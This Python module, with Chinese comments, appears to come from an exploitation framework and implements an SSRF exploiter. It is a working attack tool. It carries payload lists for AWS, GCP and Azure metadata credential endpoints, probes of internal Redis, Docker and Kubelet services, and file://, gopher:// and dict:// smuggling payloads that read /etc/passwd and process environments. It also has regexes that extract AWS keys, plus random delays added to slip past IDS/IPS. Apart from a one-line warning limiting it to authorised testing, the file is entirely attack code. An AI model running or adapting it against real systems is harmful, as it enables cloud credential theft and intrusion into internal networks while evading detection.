#!/usr/bin/env python3
"""
SSRF 利用器 - 服务端请求伪造漏洞利用

支持场景:
- 内网探测 (内网服务发现)
- 云元数据获取 (AWS/GCP/Azure)
- 内部服务访问 (Redis/MySQL/等)
- 协议走私 (gopher://, dict://, file://)

警告: 本工具仅用于授权安全测试
"""

import logging
import random
import re
import time
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple

from ..engine import (
    AccessInfo,
    BaseExploiter,
    ExploitResult,
    ExploitStatus,
    ExploitType,
    register_exploiter,
)

logger = logging.getLogger(__name__)


@register_exploiter(["ssrf"])
class SSRFExploiter(BaseExploiter):
    """服务端请求伪造利用器"""

    name = "ssrf_exploiter"
    supported_vuln_types = ["ssrf"]
    exploit_type = ExploitType.INTERNAL_ACCESS

    # 速率限制配置 - 防止触发 IDS/IPS
    PROBE_DELAY_MIN = 0.5  # 最小探测延迟（秒）
    PROBE_DELAY_MAX = 2.0  # 最大探测延迟（秒）
    MAX_PROBE_TARGETS = 20  # 最大探测目标数量

    # 云服务元数据端点
    CLOUD_METADATA_ENDPOINTS = {
        "aws": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data",
            "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
        ],
        "gcp": [
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/",
            "http://metadata.google.internal/computeMetadata/v1/project/",
        ],
        "azure": [
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        ],
        "digitalocean": [
            "http://169.254.169.254/metadata/v1/",
            "http://169.254.169.254/metadata/v1/id",
        ],
        "alibaba": [
            "http://100.100.100.200/latest/meta-data/",
            "http://100.100.100.200/latest/meta-data/instance-id",
        ],
    }

    # 常见内网服务
    INTERNAL_SERVICES = {
        "web": [
            "http://127.0.0.1:80/",
            "http://127.0.0.1:8080/",
            "http://127.0.0.1:8000/",
            "http://127.0.0.1:3000/",
            "http://localhost:80/",
            "http://localhost:8080/",
        ],
        "database": [
            "http://127.0.0.1:3306/",  # MySQL
            "http://127.0.0.1:5432/",  # PostgreSQL
            "http://127.0.0.1:27017/",  # MongoDB
            "http://127.0.0.1:6379/",  # Redis
        ],
        "admin": [
            "http://127.0.0.1:9200/",  # Elasticsearch
            "http://127.0.0.1:9000/",  # PHP-FPM/Portainer
            "http://127.0.0.1:2375/",  # Docker API
            "http://127.0.0.1:10250/",  # Kubernetes Kubelet
            "http://127.0.0.1:8443/",  # HTTPS admin
        ],
        "private_network": [
            "http://10.0.0.1/",
            "http://192.168.1.1/",
            "http://172.16.0.1/",
        ],
    }

    # 协议走私Payload
    PROTOCOL_PAYLOADS = {
        "file": [
            "file:///etc/passwd",
            "file:///etc/hosts",
            "file:///proc/self/environ",
            "file:///proc/self/cmdline",
            "file://C:/Windows/win.ini",
        ],
        "gopher_redis": [
            # Redis SLAVEOF for RCE
            "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a",
            "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$3%0d%0afoo%0d%0a$3%0d%0abar%0d%0a",
        ],
        "dict": [
            "dict://127.0.0.1:6379/INFO",
            "dict://127.0.0.1:11211/stats",
        ],
    }

    # 元数据特征
    METADATA_PATTERNS = {
        "aws_iam": r'(AKIA[0-9A-Z]{16})|("AccessKeyId")',
        "aws_instance": r"ami-[a-f0-9]+|i-[a-f0-9]+",
        "gcp": r"projects/\d+|zones/[a-z]+-[a-z]+-[a-z0-9]+",
        "azure": r"subscriptions/[a-f0-9-]+|resourceGroups/",
        "sensitive": r"password|secret|key|token|credential",
    }

    def exploit(
        self, detection_result: Any, targets: Optional[Dict[str, Any]] = None, **kwargs
    ) -> ExploitResult:
        """
        执行SSRF利用

        Args:
            detection_result: 漏洞检测结果
            targets: 利用目标配置
                - internal_targets: 内网目标列表
                - check_cloud_metadata: 是否检查云元数据
                - check_protocols: 是否尝试协议走私
        """
        start_time = time.time()

        # 提取检测信息
        url = getattr(detection_result, "url", "")
        param = getattr(detection_result, "param", "")
        payload = getattr(detection_result, "payload", "")
        extra = getattr(detection_result, "extra", {}) or {}

        if not url or not param:
            return self._create_result(
                status=ExploitStatus.NOT_APPLICABLE,
                vuln_type="ssrf",
                url=url,
                error="缺少URL或参数信息",
            )

        # 获取配置
        targets = targets or {}
        timeout = targets.get("timeout", 10)
        check_cloud = targets.get("check_cloud_metadata", True)
        check_protocols = targets.get("check_protocols", True)
        internal_targets = targets.get("internal_targets", [])

        logger.info(f"[SSRFExploiter] 开始利用 URL={url}, param={param}")

        # 收集结果
        accessible_resources = []
        metadata_found = {}
        cloud_data = {}

        # 1. 检查云元数据
        if check_cloud:
            cloud_data = self._check_cloud_metadata(url, param, timeout)
            if cloud_data:
                accessible_resources.extend(list(cloud_data.keys()))
                metadata_found.update(cloud_data)

        # 2. 探测内网服务
        internal_data = self._probe_internal_services(url, param, internal_targets, timeout)
        if internal_data:
            accessible_resources.extend(list(internal_data.keys()))

        # 3. 尝试协议走私
        protocol_data = {}
        if check_protocols:
            protocol_data = self._try_protocol_smuggling(url, param, timeout)
            if protocol_data:
                accessible_resources.extend(list(protocol_data.keys()))

        execution_time = (time.time() - start_time) * 1000

        if accessible_resources or cloud_data or protocol_data:
            # 构建访问信息
            access_info = AccessInfo(
                target="internal",
                protocol="http",
                response_content=str(cloud_data or internal_data or protocol_data)[:1000],
                accessible_resources=accessible_resources,
                metadata_found=metadata_found,
            )

            return self._create_result(
                status=ExploitStatus.SUCCESS,
                vuln_type="ssrf",
                url=url,
                access=access_info,
                data={
                    "cloud_metadata": cloud_data,
                    "internal_services": internal_data,
                    "protocol_smuggling": protocol_data,
                    "accessible_count": len(accessible_resources),
                },
                evidence=f"发现 {len(accessible_resources)} 个可访问资源",
                execution_time_ms=execution_time,
                metadata={
                    "param": param,
                    "resources": accessible_resources,
                },
            )
        else:
            return self._create_result(
                status=ExploitStatus.FAILED,
                vuln_type="ssrf",
                url=url,
                error="SSRF利用失败，未发现可访问的内部资源",
                execution_time_ms=execution_time,
            )

    def _check_cloud_metadata(self, url: str, param: str, timeout: int) -> Dict[str, Any]:
        """检查云服务元数据"""
        results = {}

        for cloud_provider, endpoints in self.CLOUD_METADATA_ENDPOINTS.items():
            for endpoint in endpoints[:3]:  # 每个云服务最多检查3个端点
                # 使用统一的HTTP客户端
                result = self.exploit_http.send_ssrf_request(url, param, endpoint, timeout)
                if result["success"] and result.get("content"):
                    content = result["content"]

                    # 检查是否有有意义的元数据
                    if self._is_valid_metadata(content, cloud_provider):
                        # 提取敏感信息
                        sensitive_data = self._extract_sensitive_data(content)
                        results[endpoint] = {
                            "provider": cloud_provider,
                            "content": content[:500],
                            "sensitive_data": sensitive_data,
                        }
                        logger.info(f"[SSRFExploiter] 发现云元数据: {cloud_provider} - {endpoint}")

        return results

    def _probe_internal_services(
        self, url: str, param: str, custom_targets: List[str], timeout: int
    ) -> Dict[str, Any]:
        """探测内网服务

        使用随机延迟以避免触发 IDS/IPS 检测
        """
        results = {}

        # 合并默认目标和自定义目标
        all_targets = []
        for service_type, targets in self.INTERNAL_SERVICES.items():
            all_targets.extend(targets[:3])  # 每类最多3个
        all_targets.extend(custom_targets)

        # 去重并限制总数
        all_targets = list(set(all_targets))[: self.MAX_PROBE_TARGETS]
        total_targets = len(all_targets)

        logger.info(f"[SSRFExploiter] 开始内网探测，共 {total_targets} 个目标")

        for idx, target in enumerate(all_targets, 1):
            # 记录探测进度
            logger.debug(f"[SSRFExploiter] 探测进度 [{idx}/{total_targets}]: {target}")

            # 使用统一的HTTP客户端
            result = self.exploit_http.send_ssrf_request(url, param, target, timeout)
            if result["success"]:
                content = result.get("content", "")
                status_code = result.get("status_code")

                # 判断服务是否可达
                if self._is_service_accessible(content, status_code, target):
                    service_info = self._identify_service(content, target)
                    results[target] = {
                        "accessible": True,
                        "status_code": status_code,
                        "service": service_info,
                        "content_preview": content[:200],
                    }
                    logger.info(f"[SSRFExploiter] 发现内网服务: {target}")

            # 添加随机延迟以避免触发 IDS/IPS
            if idx < total_targets:  # 最后一个请求后不需要延迟
                delay = random.uniform(self.PROBE_DELAY_MIN, self.PROBE_DELAY_MAX)
                logger.debug(f"[SSRFExploiter] 延迟 {delay:.2f}s 后继续探测")
                time.sleep(delay)

        logger.info(f"[SSRFExploiter] 内网探测完成，发现 {len(results)} 个可访问服务")
        return results

    def _try_protocol_smuggling(self, url: str, param: str, timeout: int) -> Dict[str, Any]:
        """尝试协议走私"""
        results = {}

        # 尝试file://协议
        for file_payload in self.PROTOCOL_PAYLOADS["file"][:3]:
            # 使用统一的HTTP客户端
            result = self.exploit_http.send_ssrf_request(url, param, file_payload, timeout)
            if result["success"] and result.get("content"):
                content = result["content"]
                if self._validate_file_content(content, file_payload):
                    results[file_payload] = {
                        "protocol": "file",
                        "content": content[:500],
                    }
                    logger.info(f"[SSRFExploiter] 文件读取成功: {file_payload}")

        # 尝试dict://协议
        for dict_payload in self.PROTOCOL_PAYLOADS["dict"][:2]:
            # 使用统一的HTTP客户端
            result = self.exploit_http.send_ssrf_request(url, param, dict_payload, timeout)
            if result["success"] and result.get("content"):
                content = result["content"]
                if "redis_version" in content.lower() or "stat" in content.lower():
                    results[dict_payload] = {
                        "protocol": "dict",
                        "content": content[:500],
                    }
                    logger.info(f"[SSRFExploiter] Dict协议成功: {dict_payload}")

        return results

    def _is_valid_metadata(self, content: str, cloud_provider: str) -> bool:
        """验证是否为有效的云元数据"""
        if not content or len(content) < 10:
            return False

        # 排除HTML错误页面
        if "<html" in content.lower() or "<!doctype" in content.lower():
            if "meta-data" not in content.lower():
                return False

        # 云特定验证
        if cloud_provider == "aws":
            return any(
                kw in content for kw in ["ami-", "i-", "instance", "iam", "security-credentials"]
            )
        elif cloud_provider == "gcp":
            return any(kw in content for kw in ["projects", "zones", "instance", "attributes"])
        elif cloud_provider == "azure":
            return any(
                kw in content for kw in ["subscriptions", "resourceGroups", "vmId", "compute"]
            )

        return True

    def _is_service_accessible(self, content: str, status_code: Optional[int], target: str) -> bool:
        """判断服务是否可访问"""
        if status_code and status_code < 400:
            return True

        # 某些服务即使返回错误也说明可达
        if status_code in [401, 403]:
            return True

        # 检查内容特征
        if content:
            # 排除HTML错误页面
            if "<html" in content.lower() and "error" in content.lower():
                return False
            return len(content) > 0

        return False

    def _identify_service(self, content: str, target: str) -> str:
        """识别服务类型"""
        content_lower = content.lower()

        # 检查常见服务特征
        if "redis" in content_lower or "+PONG" in content:
            return "Redis"
        if "mysql" in content_lower or "mariadb" in content_lower:
            return "MySQL"
        if "mongodb" in content_lower:
            return "MongoDB"
        if "elasticsearch" in content_lower or '"cluster_name"' in content:
            return "Elasticsearch"
        if "nginx" in content_lower:
            return "Nginx"
        if "apache" in content_lower:
            return "Apache"
        if "docker" in content_lower or '"Containers"' in content:
            return "Docker"
        if "kubernetes" in content_lower or "kubelet" in content_lower:
            return "Kubernetes"

        # 根据端口猜测
        if ":3306" in target:
            return "MySQL"
        if ":5432" in target:
            return "PostgreSQL"
        if ":6379" in target:
            return "Redis"
        if ":27017" in target:
            return "MongoDB"
        if ":9200" in target:
            return "Elasticsearch"

        return "Unknown"

    def _extract_sensitive_data(self, content: str) -> Dict[str, str]:
        """提取敏感数据"""
        sensitive = {}

        for name, pattern in self.METADATA_PATTERNS.items():
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                sensitive[name] = matches[:3]  # 最多3个匹配

        return sensitive

    def _validate_file_content(self, content: str, file_payload: str) -> bool:
        """验证文件内容"""
        if "/etc/passwd" in file_payload:
            return "root:" in content and ":0:0:" in content

        if "/etc/hosts" in file_payload:
            return "127.0.0.1" in content or "localhost" in content

        if "win.ini" in file_payload.lower():
            return "[fonts]" in content.lower() or "[extensions]" in content.lower()

        if "/proc/" in file_payload:
            return len(content) > 0 and not "<html" in content.lower()

        return len(content) > 10


def register_ssrf_exploiter():
    """注册SSRF利用器"""
    return SSRFExploiter
